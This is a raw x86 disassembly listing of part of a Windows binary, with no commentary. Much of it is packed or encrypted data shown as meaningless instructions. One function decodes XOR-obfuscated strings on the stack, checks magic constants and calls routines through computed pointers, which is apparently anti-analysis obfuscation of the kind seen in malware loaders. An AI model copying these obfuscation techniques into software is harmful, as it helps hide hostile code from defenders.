  4255a2:	cmp    BYTE PTR [esi+0x1ccac5d8],bl
  4255a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255a9:	mov    BYTE PTR [edi],cl
  4255ab:	fisttp QWORD PTR [edi]
  4255ad:	ins    DWORD PTR es:[edi],dx
  4255ae:	sbb    ebx,DWORD PTR [eax]
  4255b0:	cmp    edx,DWORD PTR [ecx+0x4f8e3308]
  4255b6:	lds    edx,FWORD PTR [ebx+ecx*4+0x16062952]
  4255bd:	pop    ebx
  4255be:	jecxz  0x4255b0
  4255c0:	retf   0xd8b4
  4255c3:	or     DWORD PTR [esi+ebx*1-0x6705db1e],0xffffffc1
  4255cb:	inc    esi
  4255cc:	push   bp
  4255ce:	js     0x42556b
  4255d0:	fnstenv [ebx-0x2f677efd]
  4255d6:	test   al,0x5a
  4255d8:	arpl   cx,bx
  4255da:	ficom  DWORD PTR [esi+0x42a55e39]
  4255e0:	sub    dh,al
  4255e2:	outs   dx,DWORD PTR ds:[esi]
  4255e3:	in     eax,dx
  4255e4:	sub    eax,0x3121a26
  4255e9:	cwde   
  4255ea:	call   0xe1bbdb58
  4255ef:	fwait
  4255f0:	xchg   ebp,eax
  4255f1:	push   ebp
  4255f2:	pop    eax
  4255f3:	mov    ds:0xac1dd742,eax
  4255f8:	aas    
  4255f9:	cmp    eax,0x5580a070
  4255fe:	pop    esi
  4255ff:	and    ebp,DWORD PTR [ebx]
  425601:	dec    edi
  425602:	gs xchg ebp,eax
  425604:	pop    edx
  425605:	mov    eax,ds:0x715c71b1
  42560a:	jecxz  0x4255df
  42560c:	mov    edx,0xbbba5623
  425611:	enter  0x13d1,0x9c
  425615:	lahf   
  425616:	cmp    al,bh
  425618:	scas   al,BYTE PTR es:[edi]
  425619:	ret    0xbb5c
  42561c:	sbb    al,0xfb
  42561e:	addr16 sti 
  425620:	outs   dx,BYTE PTR ds:[esi]
  425621:	mov    eax,0xfcd534e5
  425626:	fs mov bl,0xcf
  425629:	push   ds
  42562a:	cli    
  42562b:	mov    cl,0x70
  42562d:	push   ds
  42562e:	test   BYTE PTR [ebp-0x48],dh
  425631:	push   cs
  425632:	and    eax,0x62aa959
  425637:	adc    eax,0xe2c64404
  42563c:	mov    ch,bh
  42563e:	adc    al,0x89
  425640:	pop    esp
  425641:	ja     0x42568b
  425643:	(bad)
  425647:	stos   BYTE PTR es:[edi],al
  425648:	jo     0x42561f
  42564a:	or     BYTE PTR [eax+eax*1+0x74260eb7],al
  425651:	hlt    
  425652:	cwde   
  425653:	(bad)  
  425654:	icebp  
  425655:	mov    bh,0x68
  425657:	(bad)  
  425658:	fisubr DWORD PTR [edx+0x26]
  42565b:	add    BYTE PTR [esp+edi*4],dh
  42565e:	cmp    bh,BYTE PTR [ebx+0x50]
  425661:	pop    edx
  425662:	inc    edi
  425663:	inc    esi
  425664:	and    ebx,DWORD PTR [edi+0x414aea0]
  42566a:	or     ecx,DWORD PTR [edi+0x7dfb288d]
  425670:	push   ebp
  425671:	jne    0x4256d1
  425673:	int    0x6e
  425675:	(bad)  [esi]
  425677:	sub    esp,DWORD PTR [ebp+0x2ce0519d]
  42567d:	mov    cs,WORD PTR [edi+ebp*1-0x33]
  425681:	pop    edx
  425682:	fdiv   QWORD PTR [edx+0x7]
  425685:	lods   al,BYTE PTR ds:[esi]
  425686:	call   0x64f7f7cc
  42568b:	test   eax,0x6ac8f7ee
  425690:	jbe    0x2ec5d32
  425696:	(bad)  
  425697:	mov    ds:0x4b00b4d2,eax
  42569c:	dec    edi
  42569d:	pop    edi
  42569e:	jns    0x4256bf
  4256a0:	add    cl,BYTE PTR [ebx]
  4256a2:	dec    esp
  4256a3:	push   ebp
  4256a4:	scas   eax,DWORD PTR es:[edi]
  4256a5:	push   0x42ba7785
  4256aa:	push   esi
  4256ab:	push   0xffffffc2
  4256ad:	jmp    0x7ee9:0x640c734d
  4256b4:	xor    ch,dl
  4256b6:	pusha  
  4256b7:	sti    
  4256b8:	enter  0x4736,0x95
  4256bc:	or     edx,edx
  4256be:	xor    ebp,DWORD PTR [ebx-0x43252c11]
  4256c4:	sub    eax,0x454cdd51
  4256c9:	add    dl,BYTE PTR [eax-0x5a]
  4256cc:	daa    
  4256cd:	cmp    eax,0x4e6c3fc2
  4256d2:	bound  edx,QWORD PTR [edi]
  4256d4:	cli    
  4256d5:	inc    ebp
  4256d6:	(bad)  
  4256d7:	mov    eax,0xf63055dd
  4256dc:	out    dx,eax
  4256dd:	lock push ecx
  4256df:	sbb    ch,BYTE PTR [edx+edi*8-0x7dda5898]
  4256e6:	mov    ebp,0x9b9fc232
  4256eb:	xor    esp,DWORD PTR gs:[esi-0x628e1a7e]
  4256f2:	push   esp
  4256f3:	mov    WORD PTR [ebx],ss
  4256f5:	(bad)  
  4256f6:	aad    0x72
  4256f8:	add    esp,ebx
  4256fa:	sbb    BYTE PTR [ebp-0x4a],bh
  4256fd:	push   0xfffffff6
  4256ff:	ror    BYTE PTR [eax+0x3d4f9ffb],0xab
  425706:	clc    
  425707:	sbb    al,0x1
  425709:	mov    esp,0xc03c50cb
  42570e:	xor    DWORD PTR [esi+0x37],esi
  425711:	js     0x425764
  425713:	cli    
  425714:	cs mov ecx,0x53edc09f
  42571a:	test   eax,0xed14792e
  42571f:	(bad)  
  425720:	call   0xf1f6:0xa4d49861
  425727:	dec    edx
  425728:	fsub   st,st(3)
  42572a:	cmp    ecx,DWORD PTR [edx]
  42572c:	pop    ds
  42572d:	pusha  
  42572e:	int3   
  42572f:	es dec ebx
  425731:	mov    esi,0xd6a36b48
  425736:	js     0x425744
  425738:	push   ebx
  425739:	dec    edx
  42573a:	mov    al,ds:0x91b7633a
  42573f:	sahf   
  425740:	jae    0x4256f1
  425742:	jo     0x42574d
  425744:	rcl    DWORD PTR [ebp+0x7e],1
  425747:	adc    eax,0x27a9a75d
  42574c:	cmp    DWORD PTR [esi],esi
  42574e:	ror    DWORD PTR [edx],cl
  425750:	lods   eax,DWORD PTR ds:[esi]
  425751:	xchg   DWORD PTR [esi+0x12],ecx
  425754:	out    dx,al
  425755:	pop    esi
  425756:	jnp    0x42579e
  425758:	lods   al,BYTE PTR ds:[esi]
  425759:	push   ebx
  42575a:	in     eax,dx
  42575b:	test   DWORD PTR es:[edi-0x5c5baf64],edi
  425762:	aad    0xf1
  425764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425765:	adc    DWORD PTR [ecx+0x8ce501e],edx
  42576b:	push   0x26b5c40d
  425770:	mov    ecx,0xe3f46e94
  425775:	add    bl,BYTE PTR [ecx+0x53]
  425778:	loopne 0x42572b
  42577a:	fsub   st,st(3)
  42577c:	pop    ss
  42577d:	dec    ecx
  42577e:	jo     0x42575f
  425780:	pusha  
  425781:	jecxz  0x4257e8
  425783:	jmp    0x2cad:0x5797e6cf
  42578a:	inc    eax
  42578b:	scas   eax,DWORD PTR es:[edi]
  42578c:	int    0xbd
  42578e:	jp     0x42578e
  425790:	jo     0x4257d1
  425792:	in     al,0x9e
  425794:	mov    ch,0xf
  425796:	lods   al,BYTE PTR ds:[esi]
  425797:	out    0x9c,eax
  425799:	ss push ebp
  42579b:	ror    dh,cl
  42579d:	outs   dx,DWORD PTR ds:[esi]
  42579e:	les    edi,FWORD PTR [ebp+0x5a]
  4257a1:	mov    ch,0xfe
  4257a3:	popf   
  4257a4:	aam    0x61
  4257a6:	inc    eax
  4257a7:	adc    BYTE PTR [edx+0x10c12538],ah
  4257ad:	xor    edi,esp
  4257af:	cs ins BYTE PTR es:[edi],dx
  4257b1:	xchg   ebp,eax
  4257b2:	stos   BYTE PTR es:[edi],al
  4257b3:	inc    ebp
  4257b4:	inc    ebx
  4257b5:	(bad)  
  4257b6:	push   ebp
  4257b7:	or     al,dl
  4257b9:	cli    
  4257ba:	lods   al,BYTE PTR ds:[esi]
  4257bb:	xchg   esi,eax
  4257bc:	cld    
  4257bd:	popa   
  4257be:	xor    DWORD PTR [ecx+0x40],0xffffffdd
  4257c2:	push   ebx
  4257c3:	inc    ebx
  4257c4:	das    
  4257c5:	add    ah,BYTE PTR [esi-0x70bfd65]
  4257cb:	ins    DWORD PTR es:[edi],dx
  4257cc:	fwait
  4257cd:	(bad)  
  4257ce:	pop    eax
  4257cf:	fld    DWORD PTR [ebp*8+0x42b1214d]
  4257d6:	mov    ah,0x76
  4257d8:	es repnz out dx,al
  4257db:	repnz test eax,0xbf5668da
  4257e1:	inc    ebx
  4257e2:	add    eax,0xae456e53
  4257e7:	(bad)  
  4257e8:	sub    dl,bl
  4257ea:	cmp    al,0x9d
  4257ec:	push   edi
  4257ed:	in     eax,dx
  4257ee:	mov    al,0xf7
  4257f0:	mov    esp,0xe3028b2c
  4257f5:	imul   edi,ebx,0x20
  4257f8:	sahf   
  4257f9:	data16 mov BYTE PTR [edx+ebp*8-0x56ba62de],al
  425801:	call   0x2ef9:0x8c584a7e
  425808:	es sahf 
  42580a:	mov    WORD PTR [esi-0x37d266c3],cs
  425810:	dec    ebx
  425811:	xchg   ecx,ecx
  425813:	stos   BYTE PTR es:[edi],al
  425814:	int3   
  425815:	retf   0x2dbb
  425818:	int    0x96
  42581a:	dec    ebp
  42581b:	cmp    ecx,DWORD PTR [esi-0x63]
  42581e:	icebp  
  42581f:	xor    BYTE PTR [esp+ecx*8],bh
  425822:	jg     0x425806
  425824:	aas    
  425825:	lds    ebx,FWORD PTR [eax-0x61b9d778]
  42582b:	xlat   BYTE PTR ds:[ebx]
  42582c:	mov    ecx,0x4da87842
  425831:	test   BYTE PTR [edx+0x767455ac],al
  425837:	or     edi,esp
  425839:	mov    esi,0xd28ca115
  42583e:	(bad)  
  42583f:	sbb    edx,DWORD PTR [edx+edi*2-0x44]
  425843:	mov    BYTE PTR [eax+0x2d4a0547],bl
  425849:	or     BYTE PTR [ebx+0x7776dc2a],cl
  42584f:	fldenv [ecx+edx*2+0x450eab82]
  425856:	ins    DWORD PTR es:[edi],dx
  425857:	cmp    DWORD PTR [edx-0x1d089b58],edx
  42585d:	cmc    
  42585e:	test   al,0x11
  425860:	add    BYTE PTR [ecx-0x4c],dh
  425863:	add    BYTE PTR [edx],al
  425865:	jecxz  0x425836
  425867:	repnz inc ecx
  425869:	mov    al,0x68
  42586b:	repnz or edx,ecx
  42586e:	ds cmc 
  425870:	push   edi
  425871:	(bad)  
  425872:	xor    al,0x2f
  425874:	push   0x47
  425876:	add    esi,DWORD PTR [edx-0x2d]
  425879:	and    DWORD PTR [ebp-0x7c49496],0x4f840f
  425883:	add    BYTE PTR [eax],al
  425885:	mov    DWORD PTR [ebp-0xc],esi
  425888:	mov    eax,DWORD PTR [ebp-0xc]
  42588b:	mov    esi,DWORD PTR [ebp+0xc]
  42588e:	xor    eax,ecx
  425890:	lea    eax,[eax*8+0x1939820]
  425897:	mov    eax,DWORD PTR [esi+eax*1]
  42589a:	mov    DWORD PTR [ebp+0xc],eax
  42589d:	mov    eax,DWORD PTR [ebp-0x4]
  4258a0:	mov    esi,DWORD PTR [ebp-0x8]
  4258a3:	xor    eax,ecx
  4258a5:	xor    esi,ecx
  4258a7:	add    esi,edx
  4258a9:	add    eax,edx
  4258ab:	imul   eax,esi
  4258ae:	mov    esi,DWORD PTR [ebp+0xc]
  4258b1:	cmp    esi,eax
  4258b3:	je     0x4258d4
  4258b9:	mov    eax,DWORD PTR [ebp-0x4]
  4258bc:	xor    eax,ecx
  4258be:	mov    ecx,DWORD PTR [ebp+0xc]
  4258c1:	add    eax,edx
  4258c3:	imul   eax,ecx
  4258c6:	add    eax,DWORD PTR [ebp+0x8]
  4258c9:	mov    DWORD PTR [ebp+0xc],eax
  4258cc:	mov    eax,DWORD PTR [ebp+0xc]
  4258cf:	jmp    0x4258e5
  4258d4:	mov    eax,DWORD PTR [ebp-0x4]
  4258d7:	mov    esi,DWORD PTR [ebp-0x8]
  4258da:	xor    esi,ecx
  4258dc:	xor    eax,ecx
  4258de:	add    esi,edx
  4258e0:	add    eax,edx
  4258e2:	imul   eax,esi
  4258e5:	pop    edi
  4258e6:	pop    esi
  4258e7:	leave  
  4258e8:	ret    0x8
	...
  4258f3:	add    ah,cl
  4258f5:	cmp    al,0xf3
  4258f7:	dec    ebp
  4258f8:	add    BYTE PTR [eax],al
  4258fa:	add    BYTE PTR [eax],al
  4258fc:	add    al,BYTE PTR [eax]
  4258fe:	add    BYTE PTR [eax],al
  425900:	add    BYTE PTR ss:[eax],al
  425903:	add    BYTE PTR [eax],dl
  425905:	pop    ecx
  425906:	add    al,BYTE PTR [eax]
  425908:	adc    BYTE PTR [ebp+0x2],cl
  42590b:	add    BYTE PTR [eax],al
  42590d:	add    BYTE PTR [eax],al
  42590f:	add    BYTE PTR [edx+0x53],dl
  425912:	inc    esp
  425913:	push   ebx
  425914:	jge    0x425903
  425916:	pop    eax
  425917:	loopne 0x425996
  425919:	mov    esi,0x118840c6
  42591e:	out    0x3d,al
  425920:	cs pop edi
  425922:	xor    dl,dl
  425924:	add    DWORD PTR [eax],eax
  425926:	add    BYTE PTR [eax],al
  425928:	inc    edi
  425929:	cmp    bl,BYTE PTR [ebx+edx*2+0x79]
  42592d:	jae    0x42594f
  42592f:	inc    esp
  425930:	imul   esi,DWORD PTR [edx+0x20],0x5c6e6957
  425937:	inc    esi
  425938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x49617461
  425940:	outs   dx,BYTE PTR ds:[esi]
  425941:	jae    0x4259ac
  425943:	fs add BYTE PTR gs:[ebx-0x137e13ab],cl
  42594b:	or     BYTE PTR [ecx],al
  42594d:	add    BYTE PTR [eax],al
  42594f:	push   ebx
  425950:	mov    eax,ebx
  425952:	xchg   ecx,eax
  425953:	mov    eax,DWORD PTR [ebp+0x8]
  425956:	cmp    eax,0xf89c85a5
  42595b:	jne    0x425e1c
  425961:	mov    eax,DWORD PTR [ebp+0xc]
  425964:	cmp    eax,0xf89c85a2
  425969:	jne    0x425e1c
  42596f:	mov    eax,DWORD PTR [ebp+0x24]
  425972:	mov    DWORD PTR [ebp-0x4],eax
  425975:	mov    eax,DWORD PTR [ebp-0x4]
  425978:	mov    eax,DWORD PTR [eax+0x1d8]
  42597e:	mov    eax,DWORD PTR [eax]
  425980:	mov    eax,DWORD PTR [eax]
  425982:	mov    DWORD PTR [ebp-0x8],eax
  425985:	mov    BYTE PTR [ebp-0x18],0x1a
  425989:	mov    BYTE PTR [ebp-0x17],0x1f
  42598d:	mov    BYTE PTR [ebp-0x16],0x18
  425991:	mov    BYTE PTR [ebp-0x15],0x4e
  425995:	mov    BYTE PTR [ebp-0x14],0x51
  425999:	mov    BYTE PTR [ebp-0x13],0x83
  42599d:	mov    BYTE PTR [ebp-0x20],0xc
  4259a1:	mov    BYTE PTR [ebp-0x1f],0xe
  4259a5:	mov    BYTE PTR [ebp-0x1e],0x1c
  4259a9:	mov    BYTE PTR [ebp-0x1d],0x11
  4259ad:	mov    BYTE PTR [ebp-0x1c],0x4e
  4259b1:	mov    BYTE PTR [ebp-0x1b],0x51
  4259b5:	mov    BYTE PTR [ebp-0x1a],0x83
  4259b9:	mov    BYTE PTR [ebp-0x28],0xe
  4259bd:	mov    BYTE PTR [ebp-0x27],0x1b
  4259c1:	mov    BYTE PTR [ebp-0x26],0x17
  4259c5:	mov    BYTE PTR [ebp-0x25],0xa
  4259c9:	mov    BYTE PTR [ebp-0x24],0x20
  4259cd:	mov    BYTE PTR [ebp-0x23],0x13
  4259d1:	mov    BYTE PTR [ebp-0x22],0x18
  4259d5:	mov    BYTE PTR [ebp-0x21],0x83
  4259d9:	xor    ecx,ecx
  4259db:	lea    eax,[ebp+ecx*1-0x18]
  4259df:	movzx  edx,BYTE PTR [eax]
  4259e2:	xor    edx,0x7e
  4259e5:	add    edx,0x3
  4259e8:	inc    ecx
  4259e9:	mov    BYTE PTR [eax],dl
  4259eb:	cmp    ecx,0x6
  4259ee:	jb     0x4259db
  4259f0:	xor    ecx,ecx
  4259f2:	lea    eax,[ebp+ecx*1-0x20]
  4259f6:	movzx  edx,BYTE PTR [eax]
  4259f9:	xor    edx,0x7e
  4259fc:	add    edx,0x3
  4259ff:	inc    ecx
  425a00:	mov    BYTE PTR [eax],dl
  425a02:	cmp    ecx,0x7
  425a05:	jb     0x4259f2
  425a07:	xor    ecx,ecx
  425a09:	lea    eax,[ebp+ecx*1-0x28]
  425a0d:	movzx  edx,BYTE PTR [eax]
  425a10:	xor    edx,0x7e
  425a13:	add    edx,0x3
  425a16:	inc    ecx
  425a17:	mov    BYTE PTR [eax],dl
  425a19:	cmp    ecx,0x8
  425a1c:	jb     0x425a09
  425a1e:	lea    eax,[ebp-0x2c]
  425a21:	mov    DWORD PTR [ebp-0x8],eax
  425a24:	mov    ecx,DWORD PTR [ebp-0x8]
  425a27:	mov    eax,0x7113fccf
  425a2c:	mov    DWORD PTR [ecx],eax
  425a2e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425a31:	push   esi
  425a32:	push   edi
  425a33:	mov    esi,0x4e3e
  425a38:	mov    ebx,0x3272f5
  425a3d:	cmp    ecx,eax
  425a3f:	jne    0x425b0a
  425a45:	lea    eax,[esi+0x39]
  425a48:	mov    WORD PTR [ebp-0x78],ax
  425a4c:	mov    eax,esi
  425a4e:	mov    WORD PTR [ebp-0x76],ax
  425a52:	add    eax,0x3f
  425a55:	mov    WORD PTR [ebp-0x74],ax
  425a59:	lea    eax,[esi-0x2]
  425a5c:	mov    WORD PTR [ebp-0x72],ax
  425a60:	add    eax,0x43
  425a63:	mov    ecx,eax
  425a65:	lea    eax,[esi-0x9]
  425a68:	mov    WORD PTR [ebp-0x66],ax
  425a6c:	mov    eax,esi
  425a6e:	mov    WORD PTR [ebp-0x64],ax
  425a72:	add    eax,0xffffffec
  425a75:	mov    WORD PTR [ebp-0x62],ax
  425a79:	mov    eax,0x443
  425a7e:	mov    WORD PTR [ebp-0x60],ax
  425a82:	mov    eax,0x5670
  425a87:	mov    WORD PTR [ebp-0x5e],ax
  425a8b:	mov    eax,0x6110
  425a90:	mov    WORD PTR [ebp-0x5c],ax
  425a94:	lea    eax,[ebp-0xe0]
  425a9a:	push   eax
  425a9b:	mov    eax,DWORD PTR [ebp+0xc]
  425a9e:	mov    edi,0x75108ae
  425aa3:	xor    eax,edi
  425aa5:	add    eax,ebx
  425aa7:	push   eax
  425aa8:	mov    WORD PTR [ebp-0x70],cx
  425aac:	lea    ecx,[esi-0xe]
  425aaf:	mov    edx,ecx
  425ab1:	lea    eax,[ebp-0x78]
  425ab4:	push   eax
  425ab5:	mov    eax,DWORD PTR [ebp-0x4]
  425ab8:	mov    eax,DWORD PTR [eax+0x198]
  425abe:	mov    WORD PTR [ebp-0x6e],dx
  425ac2:	mov    edx,0x4f8a
  425ac7:	mov    WORD PTR [ebp-0x6c],dx
  425acb:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e31
  425ad2:	mov    DWORD PTR [ebp-0x5a],0x4e30f1e6
  425ad9:	mov    DWORD PTR [ebp-0xe0],0x1
  425ae3:	mov    DWORD PTR [ebp-0xdc],0x255
  425aed:	push   DWORD PTR [eax]
  425aef:	mov    eax,DWORD PTR [ebp+0x10]
  425af2:	call   eax
  425af4:	mov    DWORD PTR [ebp-0x8],eax
  425af7:	mov    eax,DWORD PTR [ebp-0x8]
  425afa:	test   eax,eax
  425afc:	je     0x425b0f
  425afe:	xor    DWORD PTR ds:0x76586876,0x87687666
  425b08:	jmp    0x425b0f
  425b0a:	mov    edi,0x75108ae
  425b0f:	mov    eax,DWORD PTR [ebp-0x4]
  425b12:	mov    ecx,DWORD PTR [eax+0x18c]
  425b18:	xor    eax,eax
  425b1a:	cmp    DWORD PTR [ecx],eax
  425b1c:	jne    0x425d8f
  425b22:	mov    ecx,DWORD PTR [ebp-0x4]
  425b25:	mov    ecx,DWORD PTR [ecx+0x17c]
  425b2b:	mov    DWORD PTR [ecx],eax
  425b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  425b30:	mov    ecx,DWORD PTR [ecx+0x180]
  425b36:	mov    DWORD PTR [ecx],eax
  425b38:	mov    eax,0x4e6d
  425b3d:	mov    WORD PTR [ebp-0x9c],ax
  425b44:	mov    eax,esi
  425b46:	mov    WORD PTR [ebp-0x9a],ax
  425b4d:	mov    eax,0x4e7d
  425b52:	mov    WORD PTR [ebp-0x98],ax
  425b59:	add    eax,0xffffffc0
  425b5c:	mov    WORD PTR [ebp-0x96],ax
  425b63:	mov    eax,0x4f8e
  425b68:	mov    WORD PTR [ebp-0x94],ax
  425b6f:	mov    eax,0x4e32
  425b74:	mov    WORD PTR [ebp-0x92],ax
  425b7b:	add    eax,0x4d
  425b7e:	mov    WORD PTR [ebp-0x90],ax
  425b85:	mov    eax,0x4e30
  425b8a:	mov    WORD PTR [ebp-0x8e],ax
  425b91:	mov    eax,esi
  425b93:	mov    WORD PTR [ebp-0x8c],ax
  425b9a:	mov    eax,0x4e31
  425b9f:	mov    WORD PTR [ebp-0x8a],ax
  425ba6:	mov    eax,0x99fd
  425bab:	mov    WORD PTR [ebp-0x88],ax
  425bb2:	mov    eax,0x8d62
  425bb7:	mov    WORD PTR [ebp-0x86],ax
  425bbe:	mov    eax,0xd66f
  425bc3:	mov    WORD PTR [ebp-0x84],ax
  425bca:	mov    eax,0xd783
  425bcf:	mov    WORD PTR [ebp-0x82],ax
  425bd6:	mov    eax,0x2780
  425bdb:	mov    WORD PTR [ebp-0x80],ax
  425bdf:	mov    eax,0x4780
  425be4:	mov    WORD PTR [ebp-0x7e],ax
  425be8:	mov    eax,0x4e33
  425bed:	push   0x8
  425bef:	mov    WORD PTR [ebp-0x7c],ax
  425bf3:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  425bfa:	mov    DWORD PTR [ebp-0xc],0x83181320
  425c01:	lea    eax,[ebp-0x10]
  425c04:	pop    ecx
  425c05:	mov    dl,BYTE PTR [eax]
  425c07:	xor    dl,0x7e
  425c0a:	add    dl,0x3
  425c0d:	mov    BYTE PTR [eax],dl
  425c0f:	inc    eax
  425c10:	dec    ecx
  425c11:	jne    0x425c05
  425c13:	lea    eax,[ebp-0x10]
  425c16:	mov    DWORD PTR [ebp-0xdc],eax
  425c1c:	lea    eax,[ebp-0xe0]
  425c22:	push   eax
  425c23:	mov    eax,DWORD PTR [ebp+0xc]
  425c26:	xor    eax,edi
  425c28:	add    eax,ebx
  425c2a:	push   eax
  425c2b:	mov    eax,DWORD PTR [ebp-0x4]
  425c2e:	add    eax,0x66
  425c31:	push   eax
  425c32:	mov    eax,DWORD PTR [ebp-0x4]
  425c35:	mov    eax,DWORD PTR [eax+0x198]
  425c3b:	mov    DWORD PTR [ebp-0xe0],0x1
  425c45:	push   DWORD PTR [eax]
  425c47:	mov    eax,DWORD PTR [ebp+0x10]
  425c4a:	call   eax
  425c4c:	mov    ecx,DWORD PTR [ebp+0x8]
  425c4f:	xor    ecx,edi
  425c51:	add    ecx,ebx
  425c53:	mov    DWORD PTR [ebp-0x8],eax
  425c56:	cmp    eax,ecx
  425c58:	jne    0x425c73
  425c5a:	mov    eax,ds:0x33730bcc
  425c5f:	or     eax,0x22150bcf
  425c64:	mov    ds:0x33730bcc,eax
  425c69:	add    eax,0x3372e92f
  425c6e:	mov    ds:0x33730bcc,eax
  425c73:	mov    ecx,0x4e66
  425c78:	mov    eax,ecx
  425c7a:	mov    WORD PTR [ebp-0x40],ax
  425c7e:	add    eax,0x5
  425c81:	mov    edx,eax
  425c83:	mov    WORD PTR [ebp-0x3e],dx
  425c87:	mov    edx,0x4f93
  425c8c:	mov    WORD PTR [ebp-0x3c],dx
  425c90:	add    edx,0xfffffff8
  425c93:	mov    WORD PTR [ebp-0x3a],dx
  425c97:	mov    edx,0x4f89
  425c9c:	mov    WORD PTR [ebp-0x38],dx
  425ca0:	add    edx,0x3
  425ca3:	mov    WORD PTR [ebp-0x36],dx
  425ca7:	mov    edx,0x4f87
  425cac:	mov    WORD PTR [ebp-0x34],dx
  425cb0:	mov    WORD PTR [ebp-0x32],cx
  425cb4:	mov    ecx,esi
  425cb6:	mov    WORD PTR [ebp-0x30],cx
  425cba:	lea    ecx,[edx-0x1]
  425cbd:	mov    edx,ecx
  425cbf:	mov    WORD PTR [ebp-0x54],dx
  425cc3:	mov    edx,eax
  425cc5:	mov    WORD PTR [ebp-0x52],dx
  425cc9:	mov    edx,0x4e73
  425cce:	mov    WORD PTR [ebp-0x50],dx
  425cd2:	mov    WORD PTR [ebp-0x4e],ax
  425cd6:	lea    eax,[edx-0xa]
  425cd9:	mov    WORD PTR [ebp-0x4c],ax
  425cdd:	add    eax,0x3
  425ce0:	mov    WORD PTR [ebp-0x4a],ax
  425ce4:	lea    eax,[edx-0xc]
  425ce7:	mov    WORD PTR [ebp-0x48],ax
  425ceb:	mov    WORD PTR [ebp-0x46],cx
  425cef:	mov    WORD PTR [ebp-0x44],si
  425cf3:	mov    eax,DWORD PTR [ebp+0x8]
  425cf6:	movzx  ecx,WORD PTR [ebp-0x54]
  425cfa:	xor    eax,edi
  425cfc:	add    eax,ebx
  425cfe:	xor    eax,ecx
  425d00:	mov    WORD PTR [ebp-0x54],ax
  425d04:	mov    eax,DWORD PTR [ebp+0x8]
  425d07:	movzx  ecx,WORD PTR [ebp-0x40]
  425d0b:	xor    eax,edi
  425d0d:	add    eax,ebx
  425d0f:	xor    eax,ecx
  425d11:	mov    WORD PTR [ebp-0x40],ax
  425d15:	xor    eax,eax
  425d17:	mov    WORD PTR [ebp-0xf4],ax
  425d1e:	mov    WORD PTR [ebp-0x108],ax
  425d25:	mov    edi,DWORD PTR [ebp+0x24]
  425d28:	lea    eax,[ebp-0xf4]
  425d2e:	lea    edx,[ebp-0x54]
  425d31:	mov    DWORD PTR [ebp-0xe0],0x2
  425d3b:	mov    DWORD PTR [ebp-0xdc],eax
  425d41:	call   0x428779
  425d46:	mov    DWORD PTR [ebp-0xd8],eax
  425d4c:	lea    eax,[ebp-0xe0]
  425d52:	push   eax
  425d53:	mov    eax,DWORD PTR [ebp+0xc]
  425d56:	xor    eax,0x75108ae
  425d5b:	add    eax,ebx
  425d5d:	push   eax
  425d5e:	lea    eax,[ebp-0x9c]
  425d64:	push   eax
  425d65:	push   DWORD PTR [ebp-0x8]
  425d68:	mov    eax,DWORD PTR [ebp+0x10]
  425d6b:	call   eax
  425d6d:	mov    edi,DWORD PTR [ebp+0x24]
  425d70:	lea    eax,[ebp-0x108]
  425d76:	lea    edx,[ebp-0x40]
  425d79:	mov    DWORD PTR [ebp-0xdc],eax
  425d7f:	call   0x428779
  425d84:	mov    DWORD PTR [ebp-0xd8],eax
  425d8a:	mov    edi,0x75108ae
  425d8f:	mov    eax,DWORD PTR [ebp+0x14]
  425d92:	push   DWORD PTR [ebp-0x4]
  425d95:	push   DWORD PTR [ebp+0x20]
  425d98:	push   DWORD PTR [ebp+0x1c]
  425d9b:	push   DWORD PTR [ebp+0x18]
  425d9e:	push   DWORD PTR [ebp+0x10]
  425da1:	push   DWORD PTR [ebp+0x8]
  425da4:	push   DWORD PTR [ebp+0xc]
  425da7:	call   0x42701a
  425dac:	test   eax,eax
  425dae:	je     0x425df2
  425db0:	add    DWORD PTR [ebp-0x4],eax
  425db3:	push   DWORD PTR [ebp-0x4]
  425db6:	lea    esi,[ebp+0x4]
  425db9:	call   0x42620a
  425dbe:	mov    eax,DWORD PTR [ebp-0x4]
  425dc1:	mov    eax,DWORD PTR [eax+0x1c8]
  425dc7:	mov    eax,DWORD PTR [eax]
  425dc9:	xor    eax,edi
  425dcb:	add    eax,ebx
  425dcd:	mov    eax,DWORD PTR [ebp-0x4]
  425dd0:	jne    0x425de8
  425dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  425dd5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425ddb:	push   DWORD PTR [ecx]
  425ddd:	mov    eax,DWORD PTR [eax+0x1e0]
  425de3:	call   DWORD PTR [eax+0x28]
  425de6:	jmp    0x425df2
  425de8:	mov    eax,DWORD PTR [eax+0x17c]
  425dee:	mov    eax,DWORD PTR [eax]
  425df0:	add    DWORD PTR [esi],eax
  425df2:	mov    eax,DWORD PTR [ebp-0x4]
  425df5:	mov    eax,DWORD PTR [eax+0x1dc]
  425dfb:	dec    DWORD PTR [eax]
  425dfd:	mov    ecx,DWORD PTR [ebp-0x4]
  425e00:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425e06:	mov    eax,DWORD PTR [eax]
  425e08:	lea    eax,[ecx+eax*4]
  425e0b:	mov    ecx,DWORD PTR [ebp-0x4]
  425e0e:	mov    ecx,DWORD PTR [ecx+0x17c]
  425e14:	mov    eax,DWORD PTR [eax]
  425e16:	mov    ecx,DWORD PTR [ecx]
  425e18:	add    DWORD PTR [eax],ecx
  425e1a:	pop    edi
  425e1b:	pop    esi
  425e1c:	pop    ebx
  425e1d:	leave  
  425e1e:	ret    0x20
  425e21:	push   edi
  425e22:	push   esi
  425e23:	push   ebx
  425e24:	push   ebp
  425e25:	mov    ebp,esp
  425e27:	mov    eax,DWORD PTR [ebp+0x24]
  425e2a:	add    DWORD PTR [ebp+0x28],eax
  425e2d:	push   eax
  425e2e:	cld    
  425e2f:	mov    esi,DWORD PTR [ebp+0x18]
  425e32:	add    DWORD PTR [ebp+0x1c],esi
  425e35:	push   esi
  425e36:	mov    esi,DWORD PTR [ebp+0x14]
  425e39:	lods   eax,DWORD PTR ds:[esi]
  425e3a:	xchg   edx,eax
  425e3b:	push   edx
  425e3c:	mov    cl,BYTE PTR [esi-0x2]
  425e3f:	or     eax,0xffffffff
  425e42:	shl    eax,cl
  425e44:	not    eax
  425e46:	push   eax
  425e47:	mov    cl,dh
  425e49:	or     eax,0xffffffff
